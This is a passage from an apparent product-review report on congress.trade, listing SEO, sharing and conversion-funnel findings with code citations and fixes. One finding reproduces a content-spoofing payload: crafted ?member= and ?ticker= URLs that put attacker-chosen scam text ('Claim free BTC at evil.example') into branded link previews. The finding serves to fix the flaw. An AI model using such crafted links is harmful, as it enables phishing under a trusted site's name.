- **Panel:** legal-compliance — Took the cited Lighthouse numbers from NOTES.md at face value (did not re-run Lighthouse); the absence of an /accessibility route/footer link is consistent with everything else read in this pass. · `legal-compliance/LEGALCOMPLIANCE-20`

### Growth, discovery, SEO and sharing (33)

The product is invisible to search, its most shareable object unfurls as a logo, conversion intent is thrown away at sign-in, and there is no funnel instrumentation to notice any of it.

#### 29. [P1] Upgrade intent is lost across sign-in: Start Free Trial → Google → lands on /?login=ok with no pricing/checkout resume

- **Where:** app/src/auth/routes.ts:132-224; app/src/ui/dashboardHtml.ts:11701-11703, 12558-12565  ·  **Surface:** Web  ·  **Category:** growth  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** An anonymous visitor who clicks Upgrade, picks Annual, and clicks Start Free Trial is sent through Google and returned to the Trends page with a 'Signed in.' toast.  They must find the Upgrade button again, re-pick the plan, and click again.  The deepest-intent users get the most friction.
- **Impact:** Checkout abandonment at the last step of the paid funnel; with no analytics (see -04) the loss is invisible.
- **Fix:** Persist intent before redirect (sessionStorage `ct.resume = {pricing:1, plan, intent}` or a `?next=` param carried through /auth/google/start → callback → /?login=ok&pricing=1&plan=annual), and in handleAuthQueryParams re-open openPricing(intent) and auto-select the plan (or call startCheckout directly when intent was 'checkout').  Also return the user to the view they were on.
- **Evidence:** dashboardHtml.ts:11828-11836 startCheckout(): `if (!ME.user) { closePricing(); openLogin(); el('loginMsg').textContent = 'Sign in to start your Premium trial.'; return; }` (re-read, exact).  loginGoogle() :11701-11705 navigates to /auth/google/start with no return/intent param.  auth/routes.ts:228 and :301 redirect to `${targetOrigin}/?login=ok` (origin only — view, pricing=1 and selected plan are dropped) — both line numbers confirmed exact on origin/main.  handleAuthQueryParams() :11991-12005 only toasts 'Signed in.' and scrubs the param; nothing re-opens the pricing modal or calls startCheckout (re-read, exact — no pricing/checkout resume logic exists anywhere in the function).
- **Panel:** growth-onboarding — All four citations (startCheckout, loginGoogle, auth/routes.ts:228/301, handleAuthQueryParams) verified exact against origin/main. · merged: billing/BILLING-10, web-ux-desktop/WEBUXDESKTOP-12 · `growth-onboarding/GROWTHONBOARDING-02`

#### 30. [P1] Zero funnel instrumentation: no event analytics, no server-side funnel counters — conversion is unmeasurable

- **Where:** Whole product (web + backend)  ·  **Surface:** Cross-surface  ·  **Category:** growth  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-08-06 (docs/reviews/2026-08-06-full-product-review.md #1457 noted 'RUM analytics silently dead'; root GA removal since)
- **What:** Upgrade clicks, plan selection, login starts/completions, checkout starts vs.  Stripe sessions created vs. subscriptions activated, export/delivery gate hits — none are recorded.  The only conversion signal is /api/admin/subscriptions after the fact.  A/B testing is impossible without a baseline.
- **Impact:** Every other growth fix here cannot be validated; pricing/copy decisions are guesswork.
- **Fix:** Add a privacy-safe first-party event endpoint (POST /api/telemetry, no PII, cookieless, aggregate counters in KV/SQLite) and fire ~10 named events from the SPA + iOS (pricing_open{intent}, plan_select, checkout_start, login_start{provider}, login_ok, checkout_success, export_gate, delivery_gate, copy_link, push_toggle).  Expose a daily funnel table in /api/admin/diagnostics.  Alternative: enable Cloudflare Zaraz/Web Analytics custom events under the existing CSP.  Update the Privacy Policy accordingly.
- **Evidence:** ui/routes.ts:40 'Analytics injection was removed (CT-AUD-P1-15)'; :167,:173 `.split('%GA_SCRIPT%').join('')` (both confirmed exact).  Only Cloudflare Web Analytics beacon remains per the capture logs — pageviews only.  grep for 'sendBeacon|/api/telemetry|track(' in dashboardHtml.ts: none found.  grep 'telemetry|metric|counter|recordEvent' in billing/routes.ts and auth/routes.ts: none found.  No 'pricing_opened', 'checkout_started', 'login_started', 'login_completed', 'export_clicked' events anywhere.
- **Panel:** growth-onboarding — Confirmed the GA-removal comment and split() calls at the exact cited lines, confirmed zero telemetry/event grep hits, and confirmed the #1457 citation is accurate in the 2026-08-06 review doc. · `growth-onboarding/GROWTHONBOARDING-04`

#### 32. [P1] robots.txt Disallow: /api/ blocks Googlebot from every data XHR, so the indexed page is a data-less shell

- **Where:** app/src/ui/routes.ts:225-227  ·  **Surface:** Web  ·  **Category:** seo  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** The site is a single HTML shell whose every visible number, trade row, politician and ticker is fetched from /api/* after load.  Because the `User-Agent: *` group disallows /api/, Google/Bing render the page without any of those fetches (and without member photos / ticker logos), so what gets indexed is the empty scaffold plus the meta description.  The X-Robots-Tag: noindex on JSON responses (app/src/security/botDefense.ts:211) already keeps JSON out of search results, so the Disallow buys nothing for search engines while destroying rendered content.
- **Impact:** Search engines cannot see any trade, politician, ticker or Trends content — the core value of the product — so long-tail queries ('nancy pelosi nvda trade', 'congress trades this week') cannot rank.  Google Images never sees politician photos/logos.
- **Fix:** Keep `Disallow: /api/` for the general group but add explicit `Allow:` lines (or a Googlebot/Bingbot group) for the read-only render paths: `/api/analytics/`, `/api/transactions`, `/api/photos/`, `/api/logos/`, `/api/feed.xml`.  Rely on the existing X-Robots-Tag: noindex to keep JSON out of results.  Verify with Search Console URL Inspection (rendered HTML) after the change.
- **Evidence:** app/src/ui/routes.ts:225-227 `User-Agent: *\nAllow: /\nDisallow: /api/` (identical on origin/main); live /robots.txt (2026-08-19) prepends a Cloudflare-managed block (`Content-Signal: search=yes,ai-train=no,use=reference` + `Allow: /`) then the app block with `Disallow: /api/` — nothing re-allows /api. web/logs/desktop-home-network.txt: 22 requests to /api/analytics/* plus /api/transactions, /api/photos/member, /api/logos/ticker supply ALL page data. Googlebot-UA GET https://congress.trade/api/analytics/summary -> 200 (server allows it; robots forbids it). Live HTML of / contains zero data text — only section <h3>s (grep of served HTML).
- **Panel:** seo-social — Reproduced live: robots.txt still disallows /api/ for *, Googlebot UA gets 200 from /api/analytics/summary, and the served HTML has no data text.  Not fixed on origin/main (routes.ts byte-identical). · `seo-social/SEOSOCIAL-01`

#### 33. [P1] No crawlable <a href> to any politician, ticker, trade or view URL — only / is discoverable

- **Where:** app/src/ui/dashboardHtml.ts:10858-10868  ·  **Surface:** Web  ·  **Category:** seo  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** new
- **What:** Google discovers URLs by following <a href> links (or a sitemap).  Every one of the ~381 politician pages (?member=slug), thousands of asset pages (?ticker=), trade permalinks (?trade=) and the ?view= tabs is reachable only through JS click handlers on non-anchor elements, so no crawler can ever reach them.  Combined with SEOSOCIAL-03 (no sitemap) the entire entity graph is invisible to search.
- **Impact:** Zero long-tail organic acquisition; competitors (capitoltrades, quiverquant, unusualwhales) own every 'politician name + stock' query.  Also hurts accessibility (href-less links are not focusable) and 'open in new tab'.
- **Fix:** Progressive enhancement: render entity cells and tabs as real `<a href="/?member=…">` / `<a href="/?ticker=…">` / `<a href="/?view=trades">` and keep the JS click interception (preventDefault) for the drawer UX; give copyLinkHtml a real href.  Add a server-rendered 'Browse' block (top politicians / tickers as links) in the shell so the shell itself links outward.
- **Evidence:** app/src/ui/dashboardHtml.ts:2501-2505 tabs are `<button data-view=…>`; entity opens are `.clickable[data-member|data-asset|data-txid]` handled by handleEntityOpenEvent (:12119); copyLinkHtml at :10542 emits `<a class="drawer-all-link clickable" data-copy-param=…>` with NO href. Live HTML anchor census (2026-08-19): 17 `<a ` tags total; the only static hrefs are /terms-of-service, /privacy-policy, /pricing, /api/feed.xml, /auth/apple/start, a cdn-cgi mailto and #trLatencySection (the rest are JS-template fragments). web/logs/page-metrics.txt: 'links total: 7'.
- **Panel:** seo-social — Anchor census on live HTML matches; line refs corrected (tabs 2501-2505, copyLinkHtml 10542, handleEntityOpenEvent 12119). · merged: growth-onboarding/GROWTHONBOARDING-10 · `seo-social/SEOSOCIAL-02`

#### 81. [P2] No landing/hero value proposition for a first anonymous visit; meta copy speaks to engineers

- **Where:** app/src/ui/dashboardHtml.ts:103, 2706  ·  **Surface:** Web  ·  **Category:** growth  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Anonymous visitors land on a dense analytics dashboard with no framing.  The one place the product explains itself (meta/OG) argues against competitors in pipeline terms ('ingestion', 'API reskin') rather than user benefit ('see every Congress stock trade within minutes of filing').  The product's real differentiator — speed vs.  Quiver/UW — lives in a pricingProof line that only appears when favourable and in a latency section far down the page.
- **Impact:** High bounce and low comprehension for search/social arrivals; weak share/SEO snippet; competitors (CapitolTrades) win on clarity.
- **Fix:** Add a compact, dismissible first-visit strip above Snapshot: one-line promise ('Every House, Senate and Executive-Branch stock disclosure, parsed the moment it is filed'), three proof chips (trades tracked, median lead vs. providers when positive, last import time), and CTAs 'Browse trades' / 'Get alerts'.  Rewrite meta/OG descriptions in user language.  Add an `<h1>` (visually integrated) for SEO.
- **Evidence:** desktop/home.png: header (logo, 4 tabs, Sign In/Upgrade), filter bar, Snapshot tiles — no headline, no sentence saying what the site is or why it is different.  dashboardHtml.ts:2705-2706 `<main>` opens with `<div class="banner" id="banner">Connecting to the live feed…</div>` (re-read, exact); grep '<h1' in dashboardHtml.ts → 0 hits (confirmed); grep -i 'welcome|onboard|how it works' → no hits.  meta description dashboardHtml.ts:103 (re-read, exact): 'First-party House & Senate STOCK Act ingestion — not a third-party API reskin. Congress.Trade runs its own pipeline to parse official disclosures into a live, filterable feed with member/ticker analytics and premium webhooks.'  Only trust cue is the footer disclaimer (:3409).
- **Panel:** growth-onboarding — Confirmed zero <h1> tags, confirmed meta description text verbatim, confirmed no welcome/onboarding copy anywhere in the file. · merged: web-ux-desktop/WEBUXDESKTOP-29 · `growth-onboarding/GROWTHONBOARDING-09`

#### 109. [P2] No sitemap.xml and robots.txt has no Sitemap: directive

- **Where:** app/src/ui/routes.ts:225-256  ·  **Surface:** Web  ·  **Category:** seo  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** With no crawlable links (SEOSOCIAL-02) a sitemap is the only remaining way to tell search engines that ?member=/?ticker=/?trade= URLs exist.  None is served.
- **Impact:** Even after fixing links, discovery of thousands of entity URLs and freshness signalling (lastmod on new filings) is slow/absent.
- **Fix:** Add `GET /sitemap.xml` (and a sitemap index if >50k URLs) generated from filers + resolved tickers + the four public views, with lastmod from latest trade per entity; cache 1h; add `Sitemap: https://congress.trade/sitemap.xml` to robots.txt; submit in Search Console/Bing.
- **Evidence:** curl https://congress.trade/sitemap.xml -> 404 text/plain (13 bytes) on 2026-08-19; app/src/ui/routes.ts has no sitemap route and the robots.txt body (:225-256) contains no `Sitemap:` line; the Cloudflare-managed prefix on the live file has none either.
- **Panel:** seo-social — Reproduced live 404 and confirmed no route / no Sitemap: line in routes.ts. · `seo-social/SEOSOCIAL-03`

#### 110. [P2] <title> and meta description are identical on every view and drawer; document.title never changes

- **Where:** app/src/ui/dashboardHtml.ts:102-103  ·  **Surface:** Web  ·  **Category:** seo  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Only og:title/og:description are per-entity; the HTML title and description that search engines, browser tabs, history, bookmarks and the native OS share sheet use are the same generic string everywhere.
- **Impact:** Every indexed URL competes with the same title; SERP snippets can't say 'Nancy Pelosi (D-CA-11) trades'; users see identical tabs/history entries; iOS/Android share sheets show a generic title.
- **Fix:** Add %TITLE%/%META_DESCRIPTION% placeholders filled from OgMeta server-side (e.g. 'Nancy Pelosi (D-CA-11) — Congress.Trade', 'NVDA — Congressional trades'), give trades/people/subs views their own OgMeta contexts, and set document.title in the tab-switch path (dashboardHtml.ts:11663) and drawer-open paths.
- **Evidence:** app/src/ui/dashboardHtml.ts:101-102 `<title>Congress.Trade</title>` and a static `<meta name="description">`; served JS contains 0 occurrences of `document.title`; applyOgMeta (app/src/ui/ogMeta.ts:184-194) fills only og:/twitter:/canonical placeholders. Live curl 2026-08-19: `/?ticker=NVDA` -> <title>Congress.Trade while og:title 'NVDA'; `/?member=house-ca11-nancy-pelosi` -> <title>Congress.Trade while og:title 'Nancy Pelosi (D-CA-11)'; `/?view=trades` -> same title/description/default OG card as /.
- **Panel:** seo-social — Reproduced on live for ticker/member/view URLs; document.title count 0 in served HTML. · `seo-social/SEOSOCIAL-04`

#### 111. [P2] og:title/og:description echo arbitrary ?member= / ?ticker= text — branded unfurl content spoofing

- **Where:** app/src/ui/ogMeta.ts:119-154  ·  **Surface:** Web  ·  **Category:** security  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Anyone can craft a congress.trade URL whose Slack/iMessage/X/Discord preview shows attacker-chosen text under the Congress.Trade site name and eagle logo.  Only DB-resolved members should get a politician card and only real tickers a company card.
- **Impact:** Phishing/scam bait on the brand's domain; also creates unbounded soft-404 URLs with unique titles for crawlers.
- **Fix:** Return the politician card only when lookupMemberShareIdentity resolves a filer; validate ticker against `^[A-Z0-9.\-]{1,10}$` AND existence in the securities/trades tables; otherwise emit the default card and, ideally, `<meta name="robots" content="noindex">` (or 404) for unresolvable entities.
- **Evidence:** Live curl 2026-08-19 `https://congress.trade/?member=Claim%20free%20BTC%20at%20evil.example` -> `<meta property="og:title" content="Claim free BTC at evil.example" />` and og:description 'Trading activity for Claim free BTC at evil.example on Congress.Trade.'; `?ticker=free%20money%20evil.example` -> og:title 'FREE MONEY EVIL.EXAMPLE'. Code: app/src/ui/ogMeta.ts:128 `const label = name || (member.length > 48 ? … : member)` falls back to the raw query value; :143-147 upper-cases any ticker string with no validation. HTML escaping (escapeAttr) is correct — content spoofing, not XSS.
- **Panel:** seo-social — Reproduced both payloads live.  Kept P2: not XSS, but arbitrary text on a branded unfurl is a usable phishing lure and trivial to close. · `seo-social/SEOSOCIAL-06`

#### 112. [P2] Canonical URL is the raw request URL — every filter/utm/case/unknown-view variant self-canonicalizes

- **Where:** app/src/ui/ogMeta.ts:113-117  ·  **Surface:** Web  ·  **Category:** seo  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Search engines treat each distinct canonical as a separate page, so filter states, campaign tags, ticker case variants and unknown views become an unbounded set of thin duplicates instead of consolidating to one URL per entity.
- **Impact:** Diluted ranking signals, crawl-budget waste, soft-404 index bloat; og:url likewise fragments share counts across variants.
- **Fix:** Build the canonical from a whitelist: `/` for trends/default, `/?view=trades|people|subs`, `/?member=<slug>`, `/?ticker=<UPPER>`, `/?trade=<id>`; drop every other param; unknown ?view -> canonical `/` (open PR #1967 normalizes unknown views client-side only, which does not change the server-emitted canonical) or 404.  Keep og:url in sync.
- **Evidence:** app/src/ui/ogMeta.ts:116-117 `const search = u.search || ''; const pageUrl = `${SITE}${path === '/' ? '/' : path}${search}`` used for both canonical and og:url. Live 2026-08-19: `/?view=trades&fq=NVDA&fw=30d` -> canonical `https://congress.trade/?view=trades&fq=NVDA&fw=30d`; `/?utm_source=x` -> canonical `…/?utm_source=x`; `/?ticker=nvda` -> canonical `…/?ticker=nvda` (og:title NVDA) vs `/?ticker=NVDA` -> `…/?ticker=NVDA`; `/?view=nonsense` -> 200 + canonical `…/?view=nonsense`. Filter code writes fq/ft/fm/fty/fch/fw into the URL (dashboardHtml.ts:5177-5186).
- **Panel:** seo-social — All four live variants reproduced.  PR #1967 is still OPEN and touches only client-side view aliasing, so it does not resolve this. · `seo-social/SEOSOCIAL-07`

#### 113. [P2] 404 is a bare text/plain page; natural paths (/trades, /people, /trends, /feed.xml, /politician/…) all 404 with no redirect

- **Where:** Unknown paths  ·  **Surface:** Web  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Users and crawlers hitting a mistyped or guessed URL get an unstyled 13-byte page with no navigation back into the app; obvious paths that people and link-shorteners try (/trades, /trends) dead-end instead of redirecting to the ?view= equivalents.
- **Impact:** Lost sessions on typo/expired links; no soft-landing for external links; brand impression.
- **Fix:** Add a Hono notFound handler serving a small branded HTML 404 (status 404, links to Trends/Trades/Directory, search box); add 301 aliases `/trades->/?view=trades`, `/trends->/`, `/directory|/people->/?view=people`, `/delivery->/?view=subs`, `/feed.xml->/api/feed.xml` (or the reverse per SEOSOCIAL-13).
- **Evidence:** .review-shots/web/desktop/notfound.png shows browser-default '404 Not Found' text; web/logs/robots-manifest.txt `GET /this-page-does-not-exist -> 404 text/plain; charset=UTF-8`; live 2026-08-19: /trades, /feed.xml -> 404 text/plain 13 bytes. app/src/ui/routes.ts registers only `/`, `/admin`, legal pages + aliases, /pricing, robots, assets — no catch-all HTML 404, no path aliases.
- **Panel:** seo-social — Screenshot viewed and live 404s reproduced. · merged: qa-bughunt/QABUGHUNT-20, web-ux-desktop/WEBUXDESKTOP-18, ux-copy/UXCOPY-32, visual-design/VISUALDESIGN-17, web-a11y/WEBA11Y-30 · `seo-social/SEOSOCIAL-08`

#### 114. [P2] RSS is not autodiscoverable: no <link rel=alternate> in <head>, and it lives under robots-disallowed, noindex /api/

- **Where:** app/src/ui/dashboardHtml.ts (footer, unchanged); app/src/ui/routes.ts:227  ·  **Surface:** Web  ·  **Category:** seo  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**  ·  **Status:** still-open-since-2026-07-28 (docs/reviews/2026-07-28-full-app-review.md W9)
- **What:** Feed readers detect feeds from `<link rel=alternate>` in the document head; search engines and feed directories can't crawl or index a feed that robots forbids and that carries noindex.
- **Impact:** Users pasting congress.trade into a reader get 'no feed found'; the feed cannot be discovered via search.
- **Fix:** Add `<link rel="alternate" type="application/rss+xml" title="Congress.Trade — Recent Trades" href="/api/feed.xml">` to the head (and per-ticker/member variants on entity URLs since the route supports ?ticker=/?member=); expose an alias `/feed.xml` outside /api or `Allow: /api/feed.xml` in robots and skip the noindex header for it.
- **Evidence:** Live HTML head (2026-08-19) has no `<link rel="alternate" type="application/rss+xml">`; the only reference is the footer anchor app/src/ui/dashboardHtml.ts:3235 `<a href="/api/feed.xml" rel="alternate" type="application/rss+xml">RSS</a>`, which browsers/readers do not use for autodiscovery. Feed response headers: `x-robots-tag: noindex` (app/src/security/botDefense.ts:211 stamps all /api/*), and robots.txt `Disallow: /api/` (routes.ts:227). /feed.xml -> 404. Prior: docs/reviews/2026-07-28-full-app-review.md W9 'RSS undiscoverable — no <link rel="alternate"> in head'.
- **Panel:** seo-social — Reproduced live.  Status corrected from 'new' to still-open: the head-link half was reported as W9 on 2026-07-28 and remains unfixed on origin/main; raised to P2 because it is a 1-line fix that has sat three weeks. · merged: growth-onboarding/GROWTHONBOARDING-22, prior-review-followup/PRIORREVIEWFOLLOWUP-15 · `seo-social/SEOSOCIAL-13`

#### 163. [P2] Premium is sold to developers but there are no public webhook/SSE docs or payload examples

- **Where:** app/src/delivery/rest.ts (no docs route added)  ·  **Surface:** Web  ·  **Category:** growth  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** new
- **What:** A developer cannot evaluate the webhook/SSE product before paying: no example JSON, no signing recipe, no event types, no rate/quotas ('up to 2 delivery methods' is the only spec).
- **Impact:** The buyer the current pricing targets has no way to validate fit → lower trial starts, higher early cancels.
- **Fix:** Serve a public /docs page (or /api/docs from openapi.yaml) with: event payload example, `X-Signature` HMAC recipe in 3 languages, SSE curl one-liner, retry/backoff, filters, quotas.  Link it from the Delivery cards and pricing modal ('See the payload').
- **Evidence:** Pricing bullets: 'signed webhooks (HMAC-verified) to any URL', 'Live SSE stream … no polling' (dashboardHtml.ts:3454-3455, :11761-11762, re-confirmed).  Delivery cards describe behaviour but show no payload schema, signature header name, retry policy, or code sample.  app/docs/openapi.yaml exists in the repo but live re-check (2026-08-19): `curl -o /dev/null -w '%{http_code}' /api/openapi.yaml` → 404, `/docs` → 404 (both confirmed); footer links are Privacy/Terms/Pricing/RSS/Support only (dashboardHtml.ts:3409-3416, confirmed) — no Docs/API link.
- **Panel:** growth-onboarding — Live-reconfirmed both 404s and the footer link list. · merged: delivery-alerts/DELIVERYALERTS-27 · `growth-onboarding/GROWTHONBOARDING-14`

#### 173. [P2] ?trade=<id> permalinks (web Copy link + iOS Share trade) unfurl as the generic home card

- **Where:** app/src/ui/ogMeta.ts:108-181  ·  **Surface:** Cross-surface  ·  **Category:** seo  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** The single most shareable object in the product — an individual disclosed trade — has no share-card treatment.  Recipients in Slack/iMessage/X see the same generic 'We ingest and publish…' card as the homepage, with no politician, ticker, side, amount or date.
- **Impact:** Shared trades don't get clicked; social/viral loop is blunted exactly where the content is most newsworthy.
- **Fix:** Add a `trade` context to resolveOgMeta: look up the transaction (filer name, side, ticker/asset, amount bracket, tx date) and render 'Nancy Pelosi bought NVDA ($1m–$5m) · Aug 5, 2026' as title/description (and later a dynamic image, SEOSOCIAL-16).  Do the same in renderDashboard next to lookupMemberShareIdentity.
- **Evidence:** app/src/ui/ogMeta.ts:119-121 reads only member/ticker/view — no `trade` branch; live curl `/?trade=aa349372-0000` (2026-08-19) -> og:title 'Congress.Trade', og:description DEFAULT_DESC, og:image /og-image.png. Web emits this URL from copyLinkHtml('trade', row.id, …) (app/src/ui/dashboardHtml.ts:11106); iOS emits it from clients/ios/CongressTrade/Views/Feed/TradeDetailView.swift:106 `shareURL(queryItem: URLQueryItem(name: "trade", value: trade.id))`.
- **Panel:** seo-social — Reproduced live; code refs verified (ogMeta.ts has no trade branch; iOS line 106 and web line 11106 correct). · merged: growth-onboarding/GROWTHONBOARDING-08 · `seo-social/SEOSOCIAL-05`

#### 191. [P2] A free account unlocks nothing on the web — no reason to sign in without paying

- **Where:** app/src/ui/dashboardHtml.ts:11591-11650  ·  **Surface:** Web  ·  **Category:** growth  ·  **Effort:** L  ·  **Verdict:** confirmed (high confidence)
- **What:** There is no free-account tier: signing in gives no watchlist, no saved filters, no follow-a-politician, no alert preference, no email.  The funnel jumps straight from anonymous to $5/mo with no intermediate commitment, and there is no way to build an audience to market to.
- **Impact:** Low sign-up rate → no retention loop, no email list, no warm audience for trial prompts.
- **Fix:** Give free accounts real value using existing backend state: follow politicians/tickers (watchlist) with a 'Following' filter on Trades/Trends, saved filter presets, default time window, and a free weekly email digest of followed names (needs RESEND already configured).  Reword the modal sub to name those benefits.  Show the pricing modal (not login) on anonymous Export CSV, then login only on Start Free Trial.
- **Evidence:** dashboardHtml.ts:3431 'Sign in to manage your account and use Premium research tools.'  Signed-in free menu :11623-11634 (re-read, exact) offers Export CSV (→ openExportCsvDialog, which for a non-premium signed-in user calls openPricing('export') at :11902), Delivery (→ premium gate), Manage Subscription, Sign Out — every item is a paywall.  Web has no watchlist/saved filters: `grep -ci watchlist dashboardHtml.ts` → 0 (re-run, confirmed), although the backend already persists savedFilters/watchlist/defaultWindow per user (client/state.ts:21-110, commands.ts:66 update_preferences — confirmed present).  Anonymous Export CSV opens the LOGIN modal first (openExportCsvDialog :11895-11899: `if (!ME.user) { openLogin(); showToast(...); return; }`) before the visitor has seen the price.
- **Panel:** growth-onboarding — All citations re-verified exact, including the 0-hit watchlist grep on dashboardHtml.ts and the openExportCsvDialog login-first branch. · `growth-onboarding/GROWTHONBOARDING-06`

#### 192. [P2] No consumer alert channel on web: Premium is webhook/SSE only; 'push is in the iOS app' with no app link and no email alerts

- **Where:** app/src/ui/dashboardHtml.ts:3130  ·  **Surface:** Web  ·  **Category:** growth  ·  **Effort:** L  ·  **Verdict:** confirmed (high confidence)
- **What:** The web's paid offer (HMAC webhooks, EventSource) is a developer product.  A retail visitor who wants 'tell me when Pelosi trades' has no option on web at all — not email, not browser push, not SMS — and is pointed to an iOS app they cannot download yet.
- **Impact:** Misses the largest paying segment for this category (retail investors following specific members/tickers, cf.  Quiver/Unusual Whales/CapitolTrades alert emails); the webhook-only pitch caps TAM at developers.
- **Fix:** Add email alerts as a first-class delivery type (reuse subscriptions filters model; Resend already wired): instant or daily digest, per ticker/member/min-amount; free tier = weekly digest, Premium = instant.  Add Web Push (VAPID) as a later option.  Replace the iOS sentence with a real App Store/TestFlight link once live, plus `<meta name="apple-itunes-app">` Smart App Banner.
- **Evidence:** desktop/delivery-full.png: 'Phone push alerts are set in the iOS app under Delivery.  On the web, create a webhook or live stream below.' — no link to the app: grep 'apps.apple.com' in dashboardHtml.ts returns only the Stripe billing-portal-adjacent subscription-management URL, not an App Store link; iOS 1.0 is still PREPARE_FOR_SUBMISSION per docs/EFFORT-LOG.md.  delivery/subscriptions.ts confirmed: the `delivery` column only ever takes 'webhook' | 'sse' (no 'email' branch anywhere in the file, confirmed via grep of the whole file).  grep 'email' in delivery/rest.ts: no email-alert route found.  auth/email.ts + Resend transport exist (sendEmail used at auth/routes.ts:264 for the now-dead magic link, and alerts/notify.ts:51 for admin-only ops alerts) but are not wired to any consumer-facing delivery type.
- **Panel:** growth-onboarding — Confirmed subscriptions.ts has only webhook/sse delivery types and sendEmail is used only for the dead magic-link and admin alerts. · merged: delivery-alerts/DELIVERYALERTS-25, web-ux-desktop/WEBUXDESKTOP-15 · `growth-onboarding/GROWTHONBOARDING-07`

#### 193. [P2] Post-checkout landing is a toast on Trends — no 'set up your first delivery' onboarding and possible entitlement race

- **Where:** app/src/ui/dashboardHtml.ts:11991-12004  ·  **Surface:** Web  ·  **Category:** growth  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)  ·  **Quick win**
- **What:** A new trialist is dropped on the Trends dashboard with a toast; the things they paid for (Delivery, CSV) are a tab/menu away with no guidance, and if the webhook has not landed yet the header may still show 'Upgrade'.
- **Impact:** Trial-to-paid conversion depends on activation in the first session; unguided trialists never create a delivery and cancel.
- **Fix:** successUrl → `/?view=subs&checkout=success&session_id={CHECKOUT_SESSION_ID}`; on arrival poll /auth/me (or /billing/status) every 2 s for ≤30 s until premium, then show an activation checklist card on Delivery ('1.  Add a webhook/SSE  2.  Export your first CSV  3.  Get the iOS app').  Same for iOS post-purchase.
- **Evidence:** billing/routes.ts:149-150 successUrl `${base}/?checkout=success`, cancelUrl `${base}/?checkout=cancel` (line numbers corrected from raw finding's :147-148 to the actual :149-150 on origin/main).  dashboardHtml.ts:11998 `if (checkout === 'success') showToast('🎉 You're in! Your premium trial is active.');` (exact line match) — no view switch, no re-poll of /auth/me.  billing/routes.ts:295-316 (re-read): checkout.session.completed only links the Stripe customer to the user; actual premium entitlement is granted by the separate, asynchronous customer.subscription.created/updated webhook — confirming the race is plausible (webhook delivery is not guaranteed to precede the browser's post-redirect page load).
- **Panel:** growth-onboarding — Line numbers for successUrl/cancelUrl corrected to :149-150 (raw finding said :147-148, off by 2 on origin/main).  Webhook race mechanism confirmed by reading the full event-type switch. · `growth-onboarding/GROWTHONBOARDING-11`

#### 247. [P3] robots.txt is internally inconsistent: Content-Signal allows search/reference while the UA blocklist disallows AI search crawlers and user-triggered fetchers; duplicate `User-agent: *` groups

- **Where:** app/src/ui/routes.ts:225-256  ·  **Surface:** Backend  ·  **Category:** seo  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** The Cloudflare-managed signal says 'you may use this content for search and as reference' and the hand-written block then blocks the agents that do exactly that (AI search indexers and on-demand user fetchers), so a user asking ChatGPT/Perplexity to open congress.trade gets refused while the stated signal permits it.  Two `User-agent: *` groups (managed + hand-written) rely on RFC 9309 merge semantics that not every parser honours correctly.
- **Impact:** Policy/legal statement and technical enforcement disagree (weakens any later claim about what was permitted); minor SEO/AEO loss.
- **Fix:** Decide the policy once: either keep ai-train=no + search=yes and remove the search/user-fetch agents (OAI-SearchBot, ChatGPT-User, PerplexityBot, Perplexity-User, Claude-Web) from the Disallow list, or set Content-Signal to search=yes,ai-input=no,ai-train=no and say so explicitly.  Merge the two `*` groups where possible, add an explicit `Allow: /api/feed.xml` if that RSS endpoint should stay crawlable, and state the same AI-training restriction in ToS §6.
- **Evidence:** Live /robots.txt (robots-manifest.txt, fetched 2026-08-19 01:32 UTC) opens with Cloudflare's managed Content-Signal preamble (search/ai-input/ai-train definitions) then, per app/src/ui/routes.ts:225 (confirmed, unchanged vs. origin/main — routes.ts has zero diff between the reviewed commit and origin/main), a hand-written `User-Agent: *` / `Disallow: /api/` group followed by per-agent `Disallow: /` blocks for GPTBot, ChatGPT-User, OAI-SearchBot, ClaudeBot, Claude-Web, CCBot, Google-Extended, Applebot-Extended, PerplexityBot, Perplexity-User, Bytespider, Amazonbot, meta-externalagent, Meta-ExternalAgent, FacebookBot, Diffbot, ImagesiftBot, Omgilibot, Omgili, YouBot, cohere-ai, cohere-training-data-crawler, Timpibot, VelenPublicWebCrawler, Scrapy (lines 229-255). Search/user-fetch agents (OAI-SearchBot, ChatGPT-User, PerplexityBot, Perplexity-User, Claude-Web) sit in the same disallow list as pure AI-training crawlers.
- **Panel:** legal-compliance — Confirmed the hand-written robots.txt route in routes.ts:225-255 verbatim and that it is unchanged on origin/main.  Downgraded 'confirmed' to 'plausible' on one sub-claim only: I could not independently verify from routes.ts alone that /api/feed.xml is actually the site's RSS feed path or that it is blocked by `Disallow: /api/` in production — that specific detail relies on the raw finding's citation of dashboardHtml.ts:3235 for the footer link, which I did not re-open.  The core inconsistency (Content-Signal vs.  UA blocklist, duplicate * groups) is directly confirmed in source. · merged: seo-social/SEOSOCIAL-22 · `legal-compliance/LEGALCOMPLIANCE-16`

#### 263. [P3] Legal pages have no meta description, canonical or OG tags

- **Where:** app/src/ui/legalHtml.ts  ·  **Surface:** Web  ·  **Category:** seo  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** The two other indexable HTML documents on the site (also linked from the App Store listing and Stripe Checkout) lack basic snippet/canonical/share metadata; `/privacy` and `/terms` 301 to them so canonical matters.
- **Impact:** Poor snippets for 'congress.trade privacy policy' queries; unfurls of the legal links show no card.
